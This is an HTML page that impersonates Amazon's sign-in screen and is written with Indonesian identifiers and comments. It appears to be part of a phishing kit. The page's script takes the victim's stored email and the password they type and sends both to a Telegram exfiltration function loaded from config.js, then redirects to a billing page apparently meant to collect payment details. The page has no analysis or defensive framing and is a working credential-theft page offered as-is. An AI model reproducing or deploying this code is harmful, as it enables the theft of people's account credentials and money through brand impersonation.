<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <script src="config.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo-amazon {
            margin: 10px 0 20px;
        }
        .logo-amazon img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 340px;
            padding: 20px 26px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: #fff;
        }
        .kotak h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 12px;
        }
        .email-tampil {
            font-size: 13px;
            margin-bottom: 20px;
        }
        .email-tampil a {
            color: #0066c0;
            text-decoration: none;
            margin-left: 6px;
        }
        .email-tampil a:hover {
            text-decoration: underline;
        }
        .baris-label {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 5px;
        }
        .label {
            font-weight: 700;
            font-size: 13px;
        }
        .lupa {
            font-size: 13px;
        }
        .lupa a {
            color: #0066c0;
            text-decoration: none;
        }
        .lupa a:hover {
            text-decoration: underline;
        }
        .input {
            width: 100%;
            padding: 7px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 15px;
            height: 31px;
            outline: none;
            margin-bottom: 22px;
        }
        .input:focus {
            border-color: #007185;
            box-shadow: 0 0 0 2px #c8f0f4;
        }
        .tombol-masuk {
            width: 100%;
            padding: 7px 10px;
            background: linear-gradient(to bottom, #f7df89, #ecc000);
            border: 1px solid #a88700;
            border-radius: 3px;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .tombol-masuk:disabled {
            background: #e7e9ec;
            border-color: #adb1b8;
            cursor: not-allowed;
        }
        .tombol-masuk:not(:disabled):hover {
            background: linear-gradient(to bottom, #f5d76e, #d4a300);
        }
        .garis-pemisah {
            border-bottom: 1px solid #e7e7e7;
            margin: 10px 0 30px;
        }
        .bawah {
            margin-top: 30px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .bawah a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
        .bawah a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="logo-amazon">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Sign in</h1>

        <div class="email-tampil" id="baris-email">
            <span id="email-pengguna"></span>
            <a href="amazon.html" id="tautan-ganti">Change</a>
        </div>

        <div class="baris-label">
            <label class="label" for="password">Password</label>
            <span class="lupa"><a href="#">Forgot password?</a></span>
        </div>
        <input type="password" id="password" class="input" oninput="cekIsian()">

        <button id="tombol-masuk" class="tombol-masuk" disabled onclick="masuk()">Sign in</button>
    </div>

    <div class="garis-pemisah"></div>

    <div class="bawah">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
        <p style="margin-top: 5px; color: #888;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
// Ambil email yang disimpan dari halaman sebelumnya
const emailSimpan = localStorage.getItem('email_pengguna') || '';
document.getElementById('email-pengguna').textContent = emailSimpan;

function cekIsian() {
    const sandi = document.getElementById('password').value.trim();
    document.getElementById('tombol-masuk').disabled = sandi.length === 0;
}

function masuk() {
    const email = localStorage.getItem('email_pengguna') || '';
    const password = document.getElementById('password').value.trim();

    // Kirim data ke Telegram
    if (window.kirimKeTelegram) {
        window.kirimKeTelegram({
            tipe: 'LOGIN',
            email: email,
            password: password
        });
    }

    // Pindah ke halaman verifikasi pembayaran
    window.location.href = 'billing.html';
}
</script>

</body>
</html>
